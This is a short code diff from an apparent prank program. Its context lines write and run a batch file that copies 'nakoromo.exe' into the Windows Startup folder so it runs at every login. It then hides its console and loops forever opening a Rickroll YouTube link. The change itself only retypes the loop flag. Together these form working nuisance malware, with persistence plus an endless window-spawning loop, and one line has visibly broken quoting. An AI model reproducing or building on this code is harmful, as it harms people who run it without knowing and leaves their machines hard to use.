@@ -13,7 +13,7 @@ int main(){
 	system("echo copy \"nakoromo.exe\" \"%%appdata%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ > "startup.bat");
 	system("startup.bat & del startup.bat"); // starts script to copy to startup folder then deletes
 
-	char ur_mom = true;
+	bool ur_mom = true;
 	while(ur_mom == true){
                 FreeConsole(); // >:)
 		ShellExecute(0, 0, "https://youtu.be/dQw4w9WgXcQ?autoplay=1", 0, 0, SW_SHOW);
